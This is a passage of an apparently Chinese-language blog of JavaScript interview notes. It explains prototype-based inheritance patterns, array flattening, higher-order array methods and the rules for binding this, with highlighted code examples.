class="hljs-property">lan</span>) <span class="hljs-comment">//[ &#x27;html&#x27;, &#x27;css&#x27;, &#x27;js&#x27; ]</span><br>instance1.<span class="hljs-title function_">sayHi</span>() <span class="hljs-comment">//TypeError: instance1.sayHi is not a function</span><br></code></pre></td></tr></table></figure><p>盗用构造函数和借助原型链正好相反，因为属性不是定义在原型上的，而是实例属性，所以实例之间可以互不影响。而且它还可以根据对不同的子类实例在调用父类构造函数的时候进行个性化的传参。</p><p>但是由于全程没有用到原型，所以子类将无法使用父类原型上的方法。</p></li><li><p>组合继承</p><p>由于<code>原型链</code>和<code>盗用构造函数</code>如此互补，我们便可以把两者优点结合起来，形成 组合继承。</p><p>它的特征是利用 原型链来继承父类原型上的方法，利用盗用构造函数的方法来继承父类的实例属性。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name ?? <span class="hljs-string">&quot;super&quot;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lan</span> = [<span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;css&quot;</span>, <span class="hljs-string">&quot;js&quot;</span>]<br>&#125;<br><span class="hljs-title class_">SuperType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-title class_">SuperType</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name) <span class="hljs-comment">//盗用构造函数继承父类实例属性</span><br>&#125;<br><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SuperType</span>() <span class="hljs-comment">//借助原型链继承父类原型上的方法</span><br><br><span class="hljs-keyword">let</span> instance1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>(<span class="hljs-string">&quot;instance1&quot;</span>)<br><span class="hljs-keyword">let</span> instance2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>(<span class="hljs-string">&quot;instance2&quot;</span>)<br>instance1.<span class="hljs-property">lan</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;vue&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance2.<span class="hljs-property">lan</span>) <span class="hljs-comment">//[ &#x27;html&#x27;, &#x27;css&#x27;, &#x27;js&#x27; ]</span><br>instance1.<span class="hljs-title function_">sayHi</span>() <span class="hljs-comment">//Hi, I&#x27;m instance1</span><br></code></pre></td></tr></table></figure><p>看起来组合继承似乎已经很完美了，即继承了实例属性也继承了原型上的方法。</p><p>但是有一点不太完美，那就是它调用了两次父类构造函数，第一次是设置子类原型的时候，第二次是子类构造函数中call调用。</p><p>有些资料说这调用两次影响性能，而我认为更应该思考的是，它调用两次后的造成的结果。</p><p>第一次调用，把父类的的一个实例设置为了子类的原型，这会发生什么？子类的原型上会出现这些属性。</p><p>而第二次调用，子类的构造函数中调用了父类构造对象，结果是子类也拥有了这些实例对象，所以由于遮蔽效应，我们访问子类实例<code>name</code>的时候，会先访问子类的实例属性<code>name</code>，而不会去访问原型上的<code>name</code>，这一点消除了使用单独使用原型链继承的缺点。</p><p>但是既有实例属性，原型上又有，虽然没什么影响，但是总感觉不太好，在之后的<code>寄生式组合继承</code> 中我们可以解决这个问题。</p></li><li><p>原型式继承。</p><p>DC在2006提出的，它的核心是一个函数。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">object</span>(<span class="hljs-params">o</span>) &#123;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">F</span>(<span class="hljs-params"></span>) &#123;&#125; <span class="hljs-comment">//创建临时构造函数</span><br>    F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = o <span class="hljs-comment">//设置o为临时构造函数的原型</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>() <span class="hljs-comment">//返回临时构造函数生成的实例</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在ES5中，实现了<code>Object.create()</code>函数，规范化了原型式继承。下面的代码里我将直接使用这个函数。</p><p>原型式继承的特征：没有构造函数，把父对象设置为子对象的原型</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> <span class="hljs-title class_">SuperObject</span> = &#123; <span class="hljs-comment">//不是构造函数，而是一个对象</span><br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;super&quot;</span>,<br>    <span class="hljs-attr">lan</span>: [<span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;css&quot;</span>, <span class="hljs-string">&quot;js&quot;</span>]<br>&#125;<br><span class="hljs-keyword">let</span> instance1 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">SuperObject</span>)<br><span class="hljs-keyword">let</span> instance2 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">SuperObject</span>)<br>instance1.<span class="hljs-property">lan</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;vue&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance2.<span class="hljs-property">lan</span>) <span class="hljs-comment">//[ &#x27;html&#x27;, &#x27;css&#x27;, &#x27;js&#x27;, &#x27;vue&#x27; ]</span><br></code></pre></td></tr></table></figure><p>由于子对象的原型是父对象，所以同样会和<code>借助原型链</code>继承方法出现类似的缺点，即各个实例之间更改属性后会相互影响，因为实际上更改的都是原型上的属性。</p></li><li><p>寄生式继承</p><p>寄生式继承我认为和原型式继承一模一样，只不过它可能更加强调【以某种方式增强对象】</p><p>它同样需要基于<code>Object.create()</code></p></li><li><p>寄生式组合继承</p><p>最完美的继承方式。我们可以从它的名字中大概能猜出了它的构成了。</p><p>首先它是组合继承，借助原型链+盗用构造函数，然后它还是寄生式的，会用到<code>Object.create</code>。</p><p>我们之前提高组合继承很完美，但是子类的原型因为是一个父类的实例，所以原型上会有一些属性，虽然由于子类还有同名实例属性的原因，这些原型上的属性会被遮蔽，但是总感觉不太好。所以我们可以利用寄生式来解决这个问题。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SuperType</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name ?? <span class="hljs-string">&quot;super&quot;</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">lan</span> = [<span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;css&quot;</span>, <span class="hljs-string">&quot;js&quot;</span>]<br>&#125;<br><span class="hljs-title class_">SuperType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span> <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I&#x27;m <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.name&#125;</span>`</span>)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">SubType</span>(<span class="hljs-params">name</span>) &#123;<br>    <span class="hljs-title class_">SuperType</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name) <span class="hljs-comment">//盗用构造函数继承父类实例属性</span><br>&#125;<br><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">SuperType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>) <span class="hljs-comment">//寄生</span><br><span class="hljs-title class_">SubType</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">SubType</span> <span class="hljs-comment">//寄生增强</span><br><br><span class="hljs-keyword">let</span> instance1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>(<span class="hljs-string">&quot;instance1&quot;</span>)<br><span class="hljs-keyword">let</span> instance2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SubType</span>(<span class="hljs-string">&quot;instance2&quot;</span>)<br>instance1.<span class="hljs-property">lan</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">&quot;vue&quot;</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(instance2.<span class="hljs-property">lan</span>) <span class="hljs-comment">//[ &#x27;html&#x27;, &#x27;css&#x27;, &#x27;js&#x27; ]</span><br>instance1.<span class="hljs-title function_">sayHi</span>() <span class="hljs-comment">//Hi, I&#x27;m instance1</span><br></code></pre></td></tr></table></figure><p>我们把之前的<code>SubType.prototype = new SuperType()</code> 换成了中间两行寄生特点的代码。</p><p>这会产生什么影响？由于子类的原型不再是父类的实例，而直接是父类的原型对象的拷贝。所以子类的原型上将不会出现父类的实例对象，解决了组合继承的不完美之处。</p><p>此外还通过重新指向子类原型的<code>constructor</code>为子类的构造函数，使得逻辑更加清楚。</p><blockquote><p>这一句就体现出了寄生继承的特点：增强</p><p>不光是简单的拷贝了一份父类的原型对象，而且设置了新的constructor指针，增强了这个拷贝的对象。</p></blockquote></li></ol><h2 id="25-函数的arguments为什么不是数组如何转化成数组"><a class="markdownIt-Anchor" href="#25-函数的arguments为什么不是数组如何转化成数组"></a> 25. 函数的arguments为什么不是数组？如何转化成数组？</h2><p>它无法调用数组的方法，说明它的原型不是数组的原型，可以证明他不是数组。由于它的属性从0开始排，可以算作类数组。</p><p>常见的类数组还有<code>HTMLCollection</code>和<code>NodeList</code>。</p><p>转化为数组的方法。</p><ol><li><p>Array.prototype.slice.call(arguments)</p></li><li><p>Array.from(arguments)</p></li><li><p>ES6展开运算符 […arguments]</p></li><li><p>Array.prototype.concat.apply([], arguments)</p></li></ol><h2 id="26-foreach中return有效果吗如何中断foreach循环"><a class="markdownIt-Anchor" href="#26-foreach中return有效果吗如何中断foreach循环"></a> 26. forEach中return有效果吗？如何中断forEach循环？</h2><p>没有效果。可以通过把整个forEach放在try-catch结构里面。当符合某个条件后进行退出。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> num = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]<br><span class="hljs-keyword">try</span> &#123;<br>    num.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (item == <span class="hljs-number">3</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;break successfully&quot;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;index&#125;</span>: <span class="hljs-subst">$&#123;item&#125;</span>`</span>)<br>        &#125;<br>    &#125;)<br>&#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e)<br>&#125;<br><span class="hljs-comment">//0: 0</span><br><span class="hljs-comment">//1: 1</span><br><span class="hljs-comment">//2: 2</span><br><span class="hljs-comment">//break!</span><br></code></pre></td></tr></table></figure><h2 id="27-js判断数组中是否包含某个值"><a class="markdownIt-Anchor" href="#27-js判断数组中是否包含某个值"></a> 27. JS判断数组中是否包含某个值</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> array = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br>array.<span class="hljs-title function_">indexOf</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">//0</span><br>array.<span class="hljs-title function_">includes</span>(<span class="hljs-number">1</span>) <span class="hljs-comment">//true</span><br>array.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item &gt; <span class="hljs-number">3</span>) <span class="hljs-comment">//4</span><br>array.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item &gt; <span class="hljs-number">3</span>) <span class="hljs-comment">//3</span><br></code></pre></td></tr></table></figure><ol><li><p>Array.prototype.indexOf</p><blockquote><p>如果数组中有给定的数，则返回它第一个下标，否则返回-1</p></blockquote></li><li><p>Array.prototype.includes</p><blockquote><p>判断数组中是否有某个数，有则返回true</p></blockquote></li><li><p>Array.prototype.find</p><blockquote><p>返回第一个符合条件的元素的<strong>值</strong></p></blockquote></li><li><p>Array.prototype.findIndex</p><blockquote><p>返回第一个符合条件的元素的<strong>下标</strong></p></blockquote></li></ol><h2 id="28-js中flat数组扁平化"><a class="markdownIt-Anchor" href="#28-js中flat数组扁平化"></a> 28. JS中flat—数组扁平化</h2><p>假设我们现在需要处理这个多维数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> array = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>]]], <span class="hljs-number">6</span>]<br><span class="hljs-keyword">let</span> str = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(array) <span class="hljs-comment">//&#x27;[1,[2,[3,[4,5]]],6]&#x27;</span><br></code></pre></td></tr></table></figure><ol><li><p>利用ES6的flat</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">array.<span class="hljs-title function_">flat</span>(<span class="hljs-title class_">Infinity</span>) <span class="hljs-comment">//[ 1, 2, 3, 4, 5, 6 ]</span><br></code></pre></td></tr></table></figure></li><li><p>replace + split</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(\[|\])/g</span>, <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;,&quot;</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> <span class="hljs-title class_">Number</span>(x)) <span class="hljs-comment">//[ 1, 2, 3, 4, 5, 6 ]</span><br></code></pre></td></tr></table></figure><blockquote><p>思路：先把数组变成字符，然后把字符里的方括号全部用正则去掉。然后根据逗号分割为数组，由于分割后的元素都变成了字符串，所以用map来转数字。</p></blockquote></li><li><p>replace + JSON.parse</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&quot;[&quot;</span> + str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(\[|\])/g</span>, <span class="hljs-string">&quot;&quot;</span>) + <span class="hljs-string">&quot;]&quot;</span>)<br></code></pre></td></tr></table></figure><p>和第二个方法类似，都是用正则把方括号全部去掉，它们的区别是字符串转数组的方法。</p></li><li><p>手动递归</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> array = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>]]], <span class="hljs-number">6</span>]<br><span class="hljs-keyword">let</span> result = []<br><span class="hljs-keyword">let</span> <span class="hljs-title function_">dfs</span> = (<span class="hljs-params">array</span>) =&gt; &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; array.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(array[i])) &#123;<br>            <span class="hljs-title function_">dfs</span>(array[i])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            result.<span class="hljs-title function_">push</span>(array[i])<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_">dfs</span>(array)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result) <span class="hljs-comment">//[ 1, 2, 3, 4, 5, 6 ]</span><br></code></pre></td></tr></table></figure></li><li><p>利用reduce实现递归</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> array = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>]]], <span class="hljs-number">6</span>]<br><span class="hljs-keyword">let</span> <span class="hljs-title function_">dfs</span> = (<span class="hljs-params">array</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> array.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">prev, cur</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">return</span> prev.<span class="hljs-title function_">concat</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(cur) ? <span class="hljs-title function_">dfs</span>(cur) : cur)<br>    &#125;, [])<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">dfs</span>(array))<br></code></pre></td></tr></table></figure></li><li><p>扩展运算符</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> array = [<span class="hljs-number">1</span>, [<span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>]]], <span class="hljs-number">6</span>]<br><span class="hljs-keyword">while</span> (array.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(item))) &#123;<br>    array = [].<span class="hljs-title function_">concat</span>(...array) <span class="hljs-comment">//每循环一次就会让多维数组降一维</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="29-什么是高阶函数"><a class="markdownIt-Anchor" href="#29-什么是高阶函数"></a> 29. 什么是高阶函数</h2><p>高阶函数是一个接受函数作为参数或者将函数作为返回值的函数。</p><p>比如<code>Array.prototype.map</code>，<code>Array.prototype.filter</code>，<code>Array.prototype.reduce</code>是语言内置的一些高阶函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br><span class="hljs-keyword">let</span> sum = a.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">prev, cur</span>) =&gt;</span> &#123;<span class="hljs-keyword">return</span> prev + cur&#125;, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><blockquote><p>可以看到reduce接受的第一个参数是一个函数，所以它是一个高阶函数</p></blockquote><h2 id="30-数组中的高阶函数"><a class="markdownIt-Anchor" href="#30-数组中的高阶函数"></a> 30. 数组中的高阶函数</h2><ol><li><p>map</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//语法</span><br><span class="hljs-keyword">let</span> new_array = arr.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span> <span class="hljs-title function_">callback</span>(<span class="hljs-params">currentValue[, index[, array]]</span>) &#123;<br>    <span class="hljs-comment">// Return element for new_array </span><br>&#125;[, thisArg])<br></code></pre></td></tr></table></figure><p>第一个参数是一个回调函数，回调函数的支持三个参数，分别是 数组中当前正在处理的值、正在处理的值的小标、和方法调用的数组。</p><p>第二个参数可以传入一个对象，然后就可以在回调参数里调用<code>this.property</code>了。</p><p>实际上map的回调参数只需要一个函数即可，可以不必显示调用它。</p><p>比如我们常见的把数组里的字符全部转化为数组的情况，可以直接这样写。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> array = [<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>]<br>array = array.<span class="hljs-title function_">map</span>(<span class="hljs-title class_">Number</span>) <span class="hljs-comment">//[ 1, 2, 3 ]</span><br></code></pre></td></tr></table></figure><p>因为Number是一个转型函数，所以直接传递它即可。</p></li><li><p>reduce</p><p>第一个参数为回调函数，回调函数的第一个参数<code>previousValue</code>表示上一个调用回调的返回值。第二个参数<code>currentValue</code>代表当前正在处理的值，第三个<code>currentIndex</code>代表数组正在处理的值的下标，第四个<code>array</code>表示正在处理的数组。</p><p>第二个参数<code>initValue</code>可选，表示第一次调用回调时的<code>previousValue</code>的值。如果没有设置，则会将<code>previousValue</code>设置为数组的第一个元素，然后<code>currentValue</code>设置为数组的第二个元素。</p></li><li><p>filter</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//语法</span><br><span class="hljs-keyword">var</span> newArray = arr.<span class="hljs-title function_">filter</span>(<span class="hljs-title function_">callback</span>(element[, index[, array]])[, thisArg])<br></code></pre></td></tr></table></figure><p>第一个参数为回调函数，第一个参数表示当前处理的值，第二个下标，第三个数组。</p><p>第二个参数可选，用于当作<code>this</code>的值。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> array = [<span class="hljs-number">1</span>, [<span class="hljs-number">1</span>], [<span class="hljs-number">2</span>]]<br>array = array.<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-property">isArray</span>) <span class="hljs-comment">//[ [ 1 ], [ 2 ] ]</span><br></code></pre></td></tr></table></figure></li><li><p>sort</p><p>传递一个排序函数。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> a = [<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]<br>a.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a - b) <span class="hljs-comment">//[ 1, 2, 3, 4 ]</span><br></code></pre></td></tr></table></figure><blockquote><p>值得注意的是，sort和前面3个不通，前面3个高阶函数对原函数没有影响，map和sort都会生成一个新的函数，reduce一般得到的是一个值，而sort由于采用了原地算法，所以会影响到原函数。</p></blockquote></li></ol><h2 id="40-谈谈你对js中this的理解"><a class="markdownIt-Anchor" href="#40-谈谈你对js中this的理解"></a> 40. 谈谈你对JS中this的理解</h2><blockquote><p>以下内容出自 《你不知道的JavaScript(上卷)》</p></blockquote><p>每个函数的this是在被调用时确定的，完全取决于函数的调用位置。</p><p>this的绑定规则可以分为四条。</p><ol><li><p>默认绑定</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>) <span class="hljs-comment">//Window &#123;0: global, window: Window, se...&#125;</span><br>&#125;<br><span class="hljs-title function_">f</span>()<br></code></pre></td></tr></table></figure> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-meta">&quot;use strict&quot;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>) <span class="hljs-comment">//undefined</span><br>&#125;<br><span class="hljs-title function_">f</span>()<br></code></pre></td></tr></table></figure><p>在非严格模式下，将把this绑定到全局对象，在浏览器器里就是Window对象。在严格模式下，就会返回this就会绑定到undefined</p></li><li><p>隐式绑定</p><p>它的特点实际上就是通过类似 <code>obj.f()</code>的形式来调用函数，这个时候它的this就会被隐式绑定到obj这个对象。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>) <span class="hljs-comment">// &#123;description: &quot;I&#x27;m an object&quot;, f: ƒ&#125;</span><br>&#125;<br><br><span class="hljs-keyword">let</span> obj = &#123;<br>    <span class="hljs-attr">description</span>: <span class="hljs-string">&quot;I&#x27;m an object&quot;</span>,<br>    f<br>&#125;<br><br>obj.<span class="hljs-title function_">f</span>()<br></code></pre></td></tr></table></figure></li><li><p>显示绑定</p><p>它利用的就是我们常见的<code>call, apply, bind</code>等函数，它们会把this显示绑定到某个对象值。</p><p>其中bind会生成一个新的函数，方便后续使用。</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">f</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title 